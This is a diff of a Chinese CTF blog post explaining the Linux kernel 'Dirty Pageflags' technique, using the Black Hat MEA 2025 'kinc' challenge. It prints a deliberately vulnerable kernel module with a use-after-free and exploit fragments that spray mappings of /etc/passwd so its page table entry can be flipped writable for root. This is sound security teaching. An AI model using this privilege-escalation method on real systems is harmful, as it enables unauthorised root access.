@@ -8,8 +8,8 @@
 <head>
   <meta charset="UTF-8">
 
-  <link rel="apple-touch-icon" sizes="76x76" href="/img/666.jpg">
-  <link rel="icon" href="/img/666.jpg">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/roxy.jpg">
+  <link rel="icon" href="/img/roxy.jpg">
   
 
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
@@ -19,12 +19,12 @@
   <meta name="author" content="roxy">
   <meta name="keywords" content="">
   
-    <meta name="description" content="Dirty Pageflags今天学习了一种在Linux内核中对PTE的exploitation技术，名为Dirty Pageflags 参考这位日本pwn大佬: https:&#x2F;&#x2F;ptr-yudai.hatenablog.com&#x2F;entry&#x2F;2025&#x2F;09&#x2F;14&#x2F;180326 前置知识PTE是Page Table Entry(页表项) 在OS的学习中，我们已经知道 它是虚拟内存管理中最核心的数据结">
+    <meta name="description" content="Dirty Pageflags 今天学习了一种在Linux内核中对PTE的exploitation技术，名为Dirty Pageflags 参考这位日本pwn大佬: https:&#x2F;&#x2F;ptr-yudai.hatenablog.com&#x2F;entry&#x2F;2025&#x2F;09&#x2F;14&#x2F;180326 前置知识 PTE是Page Table Entry(页表项) 在OS的学习中，我们已经知道 它是虚拟内存管理中最核心的数">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Dirty Pageflags Kernel pwn">
 <meta property="og:url" content="https://rr00xxyy.github.io/2026/04/06/Dirty-Pageflags-Kernel-pwn/index.html">
 <meta property="og:site_name" content="roxy&#39;s blog">
-<meta property="og:description" content="Dirty Pageflags今天学习了一种在Linux内核中对PTE的exploitation技术，名为Dirty Pageflags 参考这位日本pwn大佬: https:&#x2F;&#x2F;ptr-yudai.hatenablog.com&#x2F;entry&#x2F;2025&#x2F;09&#x2F;14&#x2F;180326 前置知识PTE是Page Table Entry(页表项) 在OS的学习中，我们已经知道 它是虚拟内存管理中最核心的数据结">
+<meta property="og:description" content="Dirty Pageflags 今天学习了一种在Linux内核中对PTE的exploitation技术，名为Dirty Pageflags 参考这位日本pwn大佬: https:&#x2F;&#x2F;ptr-yudai.hatenablog.com&#x2F;entry&#x2F;2025&#x2F;09&#x2F;14&#x2F;180326 前置知识 PTE是Page Table Entry(页表项) 在OS的学习中，我们已经知道 它是虚拟内存管理中最核心的数">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://rr00xxyy.github.io/images/135.png">
 <meta property="og:image" content="https://rr00xxyy.github.io/images/136.png">
@@ -288,10 +288,12 @@
             
               <div class="markdown-body">
                 
-                <h1 id="Dirty-Pageflags"><a href="#Dirty-Pageflags" class="headerlink" title="Dirty Pageflags"></a>Dirty Pageflags</h1><p>今天学习了一种在Linux内核中对<code>PTE</code>的exploitation技术，名为<strong>Dirty Pageflags</strong></p>
+                <h1>Dirty Pageflags</h1>
+<p>今天学习了一种在Linux内核中对<code>PTE</code>的exploitation技术，名为<strong>Dirty Pageflags</strong></p>
 <p>参考这位日本pwn大佬:</p>
 <p><a target="_blank" rel="noopener" href="https://ptr-yudai.hatenablog.com/entry/2025/09/14/180326">https://ptr-yudai.hatenablog.com/entry/2025/09/14/180326</a></p>
-<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p><strong>PTE</strong>是<code>Page Table Entry</code>(页表项)</p>
+<h2 id="前置知识">前置知识</h2>
+<p><strong>PTE</strong>是<code>Page Table Entry</code>(页表项)</p>
 <p>在OS的学习中，我们已经知道</p>
 <p>它是虚拟内存管理中最核心的数据结构之一，配合着<code>MMU</code>，用于将进程的<code>虚拟地址</code>转换为<code>物理地址</code>，并控制对该页面的<strong>访问权限</strong>和<strong>状态</strong></p>
 <p>每个页表项(通常对应<code>4KB</code>或<code>2MB</code>大小的内存页)记录了<code>虚拟页</code>被映射到了哪个<code>物理页框</code>(物理页帧号，<strong>PFN</strong>)</p>
@@ -303,18 +305,22 @@
 <p>而因为一个物理页的页大小是<code>4KB</code>，即4096字节，所以其低12位地址为0，只需存储高40位地址即可</p>
 <p>故0-11位作为<code>标志位</code>使用</p>
 <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">物理地址 = (PFN &lt;&lt; 12) + 页内偏移<br></code></pre></td></tr></table></figure>
-
 <p>我们重点关注以下<strong>标志位</strong>(Pageflags):</p>
 <ul>
-<li><p>0 位 -&gt; P(present) 用于记录页面是否在物理内存中，如果为1，则存在，如果为0，则不存在，访问该页会触发缺页异常(<code>page fault</code>)</p>
+<li>
+<p>0 位 -&gt; P(present) 用于记录页面是否在物理内存中，如果为1，则存在，如果为0，则不存在，访问该页会触发缺页异常(<code>page fault</code>)</p>
 </li>
-<li><p>1 位 -&gt; <strong>R&#x2F;W</strong>(read&#x2F;write) <strong>用于记录是否可写，0代表只读，1则代表可读写</strong></p>
+<li>
+<p>1 位 -&gt; <strong>R/W</strong>(read/write) <strong>用于记录是否可写，0代表只读，1则代表可读写</strong></p>
 </li>
-<li><p>2 位 -&gt; U&#x2F;S(user&#x2F;supervisor) 用于记录允许访问的权限级别，0代表内核态才允许访问(ring 0-2)，1则用户态亦可访问(ring 3)</p>
+<li>
+<p>2 位 -&gt; U/S(user/supervisor) 用于记录允许访问的权限级别，0代表内核态才允许访问(ring 0-2)，1则用户态亦可访问(ring 3)</p>
 </li>
-<li><p>6 位 -&gt; <strong>D</strong>(dirty) 是否被写入过，由<code>CPU</code>设置，内核用于决定换出时是否需要写回<code>磁盘</code>，即<code>脏页</code></p>
+<li>
+<p>6 位 -&gt; <strong>D</strong>(dirty) 是否被写入过，由<code>CPU</code>设置，内核用于决定换出时是否需要写回<code>磁盘</code>，即<code>脏页</code></p>
 </li>
-<li><p>63 位 -&gt; XD(execute disable) cpu从该页所取的指令是否允许执行，0为可执行，1则不可执行，我们也可以叫它<code>NX</code>😄</p>
+<li>
+<p>63 位 -&gt; XD(execute disable) cpu从该页所取的指令是否允许执行，0为可执行，1则不可执行，我们也可以叫它<code>NX</code>😄</p>
 </li>
 </ul>
 <p>试想一下</p>
@@ -332,7 +338,6 @@
 <div class="note note-info">
             <p>对于一个虚拟地址</p> <p><code>CPU</code>的<code>MMU</code>查找过程如下:</p> <p>从<code>CR3</code>寄存器获得<code>PGD</code>页的物理地址</p> <p>取虚拟地址的<code>bits 47-39</code>作为PGD索引，找到对应的PUD页表项(如果该PGD项为<code>null</code>，则触发<code>page fault</code>)</p> <p>取<code>bits 38-30</code>作为PUD索引，找到PMD页表项</p> <p>取<code>bits 29-21</code>作为PMD索引，找到PTE页表项</p> <p>取<code>bits 20-12</code>作为PTE索引，找到<strong>物理页框</strong></p> <p>ps:PTE中包含PFN与标志位，上面已经介绍过了</p> <p>最后<code>bits 11-0</code>作为页内偏移，得到最终的物理地址</p> 
           </div>
-
 <p>同时，x86-64中每一级页表都是4KB，而一个<code>entry</code>是8字节，所以每一级有<strong>512</strong>项</p>
 <p>最后，虚拟地址的高16位作用是什么呢?</p>
 <p>它们的内容必须与第47位(虚拟地址的最高有效位)完全相同</p>
@@ -345,34 +350,34 @@
 <p>这样设计的关键考量是为未来的扩展留出空间</p>
 <p>如果将来需要更大的地址空间，硬件可以增加页表层级(比如到57位)，那些高16位目前是全1或全0的规范地址，在未来依然会是有效的规范地址，保证了<strong>向前兼容性</strong></p>
 <div class="note note-secondary">
-            <p>ASLR KASLR PIE 原理</p> <p><code>/proc/sys/kernel/randomize_va_space</code></p> <p><strong>熵</strong></p> <p>待补充…</p> 
+            <p>ASLR KASLR PIE 原理</p> <p><code>/proc/sys/kernel/randomize_va_space</code></p> <p><strong>熵</strong></p> <p>待补充...</p> 
           </div>
-
 <div class="note note-danger">
-            <p>内核保护:</p> <p>SMEP SMAP KPTI KASLR</p> <p>待补充…</p> 
+            <p>内核保护:</p> <p>SMEP SMAP KPTI KASLR</p> <p>待补充...</p> 
           </div>
-
-<h2 id="exploitation"><a href="#exploitation" class="headerlink" title="exploitation"></a>exploitation</h2><p>了解了前置知识</p>
+<h2 id="exploitation">exploitation</h2>
+<p>了解了前置知识</p>
 <p>我们来看看具体的exploitation方法</p>
-<h3 id="Dirty-Pagetable"><a href="#Dirty-Pagetable" class="headerlink" title="Dirty Pagetable"></a>Dirty Pagetable</h3><p>名字似乎很像</p>
+<h3 id="Dirty-Pagetable">Dirty Pagetable</h3>
+<p>名字似乎很像</p>
 <p>但完全不一样</p>
 <p>我还没学</p>
-<p>故引用原文…</p>
+<p>故引用原文...</p>
 <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text">Dirty Pagetable is a powerful exploitation technique that targets heap vulnerabilities in the Linux kernel.<br><br>The core idea is to overlap a freed object with a page table entry (PTE). By writing to the freed object, an attacker can directly manipulate the page table. Since each PTE maps to a physical memory address, this provides extremely strong control over physical memory. As a result, Dirty Pagetable can bypass critical security mechanisms such as KASLR, SMAP, and SMEP.<br></code></pre></td></tr></table></figure>
-
-<h3 id="Dirty-Pageflags-1"><a href="#Dirty-Pageflags-1" class="headerlink" title="Dirty Pageflags"></a>Dirty Pageflags</h3><p>不同于<code>Dirty Pagetable</code>操纵整个PTE以达成任意物理地址读写原语</p>
+<h3 id="Dirty-Pageflags">Dirty Pageflags</h3>
+<p>不同于<code>Dirty Pagetable</code>操纵整个PTE以达成任意物理地址读写原语</p>
 <p><code>Dirty Pageflags</code>关注操纵PTE的标志位以完成利用并最终提权</p>
 <p>那么哪个标志位有助于我们的exploitation呢?</p>
-<p>U&#x2F;S?</p>
+<p>U/S?</p>
 <p>XD?</p>
 <p>然而并不是</p>
 <p>它们虽然涉及访问与执行权限控制，但却不能真正帮助我们exploitation</p>
-<p>考虑一下R&#x2F;W呢?</p>
+<p>考虑一下R/W呢?</p>
 <p>想象一个只读文件</p>
 <p>比如(<code>/etc/passwd</code>)</p>
 <p>我们将其映射到内存中</p>
 <p><img src="/images/138.png" srcset="/img/loading.gif" lazyload alt="如图"></p>
-<p>我们操纵其PTE的R&#x2F;W标志位</p>
+<p>我们操纵其PTE的R/W标志位</p>
 <p>利用<code>UAF</code>等漏洞</p>
 <p>将0置为1</p>
 <p>只读变为可读写</p>
@@ -383,11 +388,12 @@
 <p>最后，当内存区域被解除映射(<code>unmap</code>)时，Linux内核看到该页的<code>D</code>位被置1，就会认为这个页面必须被回写到它对应的后备文件</p>
 <p>于是原本应该只读的文件(<code>/etc/passwd</code>)就被我们所写的恶意内容所覆盖了</p>
 <p>root到手</p>
-<h2 id="example"><a href="#example" class="headerlink" title="example"></a>example</h2><p>题目来自2025 Black Hat MEA资格赛的pwn kinc</p>
-<h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><p>下面是<code>vuln.c</code></p>
+<h2 id="example">example</h2>
+<p>题目来自2025 Black Hat MEA资格赛的pwn kinc</p>
+<h3 id="源码分析">源码分析</h3>
+<p>下面是<code>vuln.c</code></p>
 <p>不用逆向，真不错</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/fs.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/miscdevice.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/module.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/mutex.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/slab.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/uaccess.h&gt;</span></span><br><br>MODULE_LICENSE(<span class="hljs-string">&quot;GPL&quot;</span>);<br>MODULE_AUTHOR(<span class="hljs-string">&quot;ptr-yudai&quot;</span>);<br>MODULE_DESCRIPTION(<span class="hljs-string">&quot;A vulnerable driver for a CTF&quot;</span>);<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CMD_ALLOC   0x0268</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CMD_INC     0x0298</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CMD_SEL     0x01c1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CMD_DELETE  0x0831</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_OBJ_NUM 0x100</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PAD_SIZE    0x7f8</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">obj</span> &#123;</span><br>  <span class="hljs-type">char</span> buf[PAD_SIZE];<br>  <span class="hljs-type">size_t</span> cnt;<br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache</span> *<span class="hljs-title">obj_cachep</span>;</span><br><span class="hljs-type">static</span> <span class="hljs-title function_">DEFINE_MUTEX</span><span class="hljs-params">(module_lock)</span>;<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> inc_used = <span class="hljs-number">0</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">obj</span> *<span class="hljs-title">selected</span> =</span> <span class="hljs-number">0</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">obj</span> *<span class="hljs-title">obj_array</span>[<span class="hljs-title">MAX_OBJ_NUM</span>] =</span> &#123; <span class="hljs-literal">NULL</span> &#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">module_ioctl</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *file, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg)</span> &#123;<br>  <span class="hljs-type">long</span> ret = -EINVAL;<br>  mutex_lock(&amp;module_lock);<br><br>  <span class="hljs-keyword">if</span> (arg &gt;= MAX_OBJ_NUM)<br>    <span class="hljs-keyword">goto</span> out;<br><br>  <span class="hljs-keyword">switch</span> (cmd) &#123;<br>    <span class="hljs-keyword">case</span> CMD_ALLOC:<br>      obj_array[arg] = kmem_cache_zalloc(obj_cachep, GFP_KERNEL);<br>      ret = <span class="hljs-number">0</span>;<br>      <span class="hljs-keyword">break</span>;<br><br>    <span class="hljs-keyword">case</span> CMD_SEL:<br>      <span class="hljs-keyword">if</span> (!obj_array[arg])<br>        <span class="hljs-keyword">goto</span> out;<br>      selected = obj_array[arg];<br>      ret = <span class="hljs-number">0</span>;<br>      <span class="hljs-keyword">break</span>;<br><br>    <span class="hljs-keyword">case</span> CMD_INC:<br>      <span class="hljs-keyword">if</span> (inc_used++ &gt; <span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">goto</span> out;<br>      selected-&gt;cnt++;<br>      ret = <span class="hljs-number">0</span>;<br>      <span class="hljs-keyword">break</span>;<br><br>    <span class="hljs-keyword">case</span> CMD_DELETE:<br>      <span class="hljs-keyword">if</span> (!obj_array[arg])<br>        <span class="hljs-keyword">goto</span> out;<br>      kmem_cache_free(obj_cachep, obj_array[arg]);<br>      obj_array[arg] = <span class="hljs-literal">NULL</span>;<br>      ret = <span class="hljs-number">0</span>;<br>      <span class="hljs-keyword">break</span>;<br>  &#125;<br><br> out:<br>  mutex_unlock(&amp;module_lock);<br>  <span class="hljs-keyword">return</span> ret;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file_operations</span> <span class="hljs-title">module_fops</span> =</span> &#123;<br>  .owner          = THIS_MODULE,<br>  .unlocked_ioctl = module_ioctl,<br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">miscdevice</span> <span class="hljs-title">vuln_dev</span> =</span> &#123;<br>  .minor = MISC_DYNAMIC_MINOR,<br>  .name = <span class="hljs-string">&quot;vuln&quot;</span>,<br>  .fops = &amp;module_fops<br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> __init <span class="hljs-title function_">module_initialize</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br>  <span class="hljs-keyword">if</span> (misc_register(&amp;vuln_dev) != <span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">return</span> -EBUSY;<br><br>  obj_cachep = KMEM_CACHE(obj, <span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">if</span> (!obj_cachep) &#123;<br>    misc_deregister(&amp;vuln_dev);<br>    <span class="hljs-keyword">return</span> -EBUSY;<br>  &#125;<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> __exit <span class="hljs-title function_">module_cleanup</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br>  misc_deregister(&amp;vuln_dev);<br>  mutex_destroy(&amp;module_lock);<br>&#125;<br><br>module_init(module_initialize);<br>module_exit(module_cleanup);<br></code></pre></td></tr></table></figure>
-
 <p>内核模块<code>vuln.ko</code>提供了以下<code>ioctl</code>命令:</p>
 <p>CMD_ALLOC -&gt; 分配一个<code>struct obj</code>(大小为<code>0x800</code>字节)，存入<code>obj_array[index]</code></p>
 <p>CMD_SEL -&gt; 将<code>selected</code>指针指向<code>obj_array[index]</code></p>
@@ -409,30 +415,30 @@
 <p>该如何完成利用呢?</p>
 <p>想必你已经想到了</p>
 <p>我们将只读的<code>/etc/passwd</code>映射到内存中</p>
-<p>其在PTE表项中的低2位分别是标志位P和R&#x2F;W</p>
+<p>其在PTE表项中的低2位分别是标志位P和R/W</p>
 <p>表现为 0(只读) 1(present)</p>
 <p>我们利用UAF</p>
 <p>执行两次<code>CMD_INC</code></p>
 <p>标志位变为</p>
 <p>1(<strong>可读可写</strong>!) 1(present 保证存在)</p>
-<p>随后写入恶意内容，例如，将root的密码设为空…</p>
+<p>随后写入恶意内容，例如，将root的密码设为空...</p>
 <p>便能完成利用并提权</p>
 <p>但是有一个问题</p>
-<p>如何保证我们能控制UAF的object恰好对应&#x2F;etc&#x2F;passwd的PTE呢?</p>
+<p>如何保证我们能控制UAF的object恰好对应/etc/passwd的PTE呢?</p>
 <p>那便要引出<strong>spray</strong>技术了</p>
-<h3 id="spray"><a href="#spray" class="headerlink" title="spray"></a>spray</h3><p>从栈的<code>nop sled</code>到堆的<code>heap spray</code>(<strong>堆喷射</strong>)</p>
+<h3 id="spray">spray</h3>
+<p>从栈的<code>nop sled</code>到堆的<code>heap spray</code>(<strong>堆喷射</strong>)</p>
 <p>其都是<code>spray</code>技术的思想</p>
 <p><strong>spray</strong>(<code>喷射</code>)是一种用来提高漏洞利用成功率的<code>弹药填充</code>或<code>地貌改造</code>技术</p>
 <p>它本身不直接制造漏洞</p>
 <p>而是创造一个对攻击者有利的内存环境</p>
 <p>让后续的漏洞利用(如UAF，堆溢出)更容易且稳定地命中目标</p>
-<h3 id="具体exploitation"><a href="#具体exploitation" class="headerlink" title="具体exploitation"></a>具体exploitation</h3><p>我们先定义下列函数:</p>
+<h3 id="具体exploitation">具体exploitation</h3>
+<p>我们先定义下列函数:</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">char</span>* <span class="hljs-title function_">PTI_TO_VIRT</span><span class="hljs-params">(<span class="hljs-type">size_t</span> pgd, <span class="hljs-type">size_t</span> pud, <span class="hljs-type">size_t</span> pmd, <span class="hljs-type">size_t</span> pte)</span> &#123;<br>  assert (pgd &lt; <span class="hljs-number">0x200</span> &amp;&amp; pud &lt; <span class="hljs-number">0x200</span> &amp;&amp; pmd &lt; <span class="hljs-number">0x200</span> &amp;&amp; pte &lt; <span class="hljs-number">0x200</span>);<br>  <span class="hljs-keyword">return</span> (<span class="hljs-type">void</span>*)((pgd &lt;&lt; <span class="hljs-number">39</span>) + (pud &lt;&lt; <span class="hljs-number">30</span>) + (pmd &lt;&lt; <span class="hljs-number">21</span>) + (pte &lt;&lt; <span class="hljs-number">12</span>));<br>&#125;<br><span class="hljs-type">void</span>* <span class="hljs-title function_">mmap_by_pti</span><span class="hljs-params">(<span class="hljs-type">size_t</span> pgd, <span class="hljs-type">size_t</span> pud, <span class="hljs-type">size_t</span> pmd, <span class="hljs-type">size_t</span> pte)</span> &#123;<br>  <span class="hljs-type">void</span> *p = (<span class="hljs-type">void</span>*)PTI_TO_VIRT(pgd, pud, pmd, pte);<br>  <span class="hljs-type">void</span> *q = mmap(p, <span class="hljs-number">0x1000</span>, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_SHARED|MAP_FIXED, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>  assert (p == q);<br>  <span class="hljs-keyword">return</span> p;<br>&#125;<br><span class="hljs-type">void</span>* <span class="hljs-title function_">mmap_file_by_pti</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">size_t</span> pgd, <span class="hljs-type">size_t</span> pud, <span class="hljs-type">size_t</span> pmd, <span class="hljs-type">size_t</span> pte)</span> &#123;<br>  <span class="hljs-type">void</span> *p = (<span class="hljs-type">void</span>*)PTI_TO_VIRT(pgd, pud, pmd, pte);<br>  <span class="hljs-type">void</span> *q = mmap(p, <span class="hljs-number">0x1000</span>, PROT_READ, MAP_SHARED|MAP_FIXED, fd, <span class="hljs-number">0</span>);<br>  assert (p == q);<br>  <span class="hljs-keyword">return</span> p;<br>&#125;<br></code></pre></td></tr></table></figure>
-
 <p><code>PTI_TO_VIRT</code>函数接受PGD，PUD，PMD，PTE四个索引值，并将它们<code>拼接</code>成一个完整的虚拟地址</p>
 <p>公式:</p>
 <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">虚拟地址 = (pgd &lt;&lt; 39) | (pud &lt;&lt; 30) | (pmd &lt;&lt; 21) | (pte &lt;&lt; 12)<br></code></pre></td></tr></table></figure>
-
 <p>ps:前置知识已总结</p>
 <p>低12位默认为0，因此函数返回的是每个页表条目对应的页起始地址</p>
 <p>这样构造出的虚拟地址在用户态是合法的，可用于后面的<code>mmap</code>操作，从而实现精确控制页表布局</p>
@@ -442,7 +448,6 @@
 <p>我们先利用ioctl的<code>CMD_ALLOC</code>分配0x100，即256个obj，每个obj的大小为<code>0x800</code>字节，即2KB</p>
 <p>一共是512KB</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache</span> *<span class="hljs-title">obj_cachep</span>;</span><br><br><span class="hljs-keyword">case</span> CMD_ALLOC:<br>    obj_array[arg] = kmem_cache_zalloc(obj_cachep, GFP_KERNEL);<br>    ret = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">break</span>;<br></code></pre></td></tr></table></figure>
-
 <p>这些obj并非直接从<strong>伙伴系统</strong>(<code>buddy system</code>)分配，而是来自内核为该模块预先创建的专用<strong>slab 缓存</strong>(<code>obj_cachep</code>)</p>
 <p><strong>slab分配器</strong>负责从伙伴系统申请物理页(4KB)，然后将每个页切割成若干个大小相同的对象</p>
 <p>对于2KB的obj，每个物理页可以容纳2个对象(<code>objs_per_slab = 2</code>)</p>
@@ -454,7 +459,6 @@
 <p>这样，当对象释放后，新分配的PTE表就能精准占据obj原本占用的物理页</p>
 <p>形成精准的<strong>UAF</strong></p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> etcfd = open(<span class="hljs-string">&quot;/etc/passwd&quot;</span>, O_RDONLY);<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ENTRY_PER_TABLE 512</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SPRAY_NUM 0x1800</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DELTA 0x7f8</span><br><br><span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>; i &lt; SPRAY_NUM / ENTRY_PER_TABLE; i++) &#123;<br>  <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> j = <span class="hljs-number">0</span>; j &lt; ENTRY_PER_TABLE; j++) &#123;<br>    mmap_file_by_pti(etcfd, <span class="hljs-number">1</span>, i, j, DELTA / <span class="hljs-number">8</span>);<br>    mmap_file_by_pti(etcfd, <span class="hljs-number">1</span>, i, j, (<span class="hljs-number">0x800</span> + DELTA) / <span class="hljs-number">8</span>);<br>  &#125;<br>  <span class="hljs-keyword">volatile</span> <span class="hljs-type">char</span> c = *PTI_TO_VIRT(<span class="hljs-number">1</span>, i, <span class="hljs-number">0</span>, DELTA / <span class="hljs-number">8</span>); <span class="hljs-comment">// Allocate PGD and PMD</span><br>&#125;<br></code></pre></td></tr></table></figure>
-
 <p>其中<code>mmap_file_by_pti</code>使用<code>MAP_FIXED</code>将<code>/etc/passwd</code>的第一个页面(偏移0)强制映射到虚拟地址<code>PTI_TO_VIRT(1, i, j, pte_idx)</code></p>
 <p>这里<code>pte_idx</code>分别为<code>DELTA/8</code>和<code>(0x800+DELTA)/8</code></p>
 <p>即为255和511</p>
@@ -468,7 +472,6 @@
 <div class="note note-danger">
             <p>内核采用<strong>惰性分配策略</strong>，直到第一次访问该地址时，才会通过缺页异常(page fault)建立真正的页表</p> 
           </div>
-
 <p>因此</p>
 <p>当执行<code>volatile char c = *PTI_TO_VIRT(1, i, 0, DELTA / 8)</code>时</p>
 <p>PGD索引依旧固定为1，PMD和PTE索引则设置为0和255</p>
@@ -476,7 +479,6 @@
 <p>此时触发了<strong>缺页异常</strong>，内核才完成了从PGD到PTE的各级页表分配，并建立了到文件缓存物理页(<code>/etc/passwd</code>)的映射</p>
 <p>再引用一句原文:</p>
 <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">Unlike Dirty Pagetable, here we are repeatedly mapping the same file. As a result, only a single physical memory page is allocated for the file contents. This means Dirty Pageflags consumes far less memory compared to Dirty Pagetable, which I think is another advantage.<br></code></pre></td></tr></table></figure>
-
 <p>我们总共创建了<code>12 × 512 × 2 = 12288</code>个虚拟内存页(每个4KB)</p>
 <p>但它们实际上都指向同一个物理页</p>
 <p>即<code>/etc/passwd</code>的文件缓存页</p>
@@ -486,15 +488,12 @@
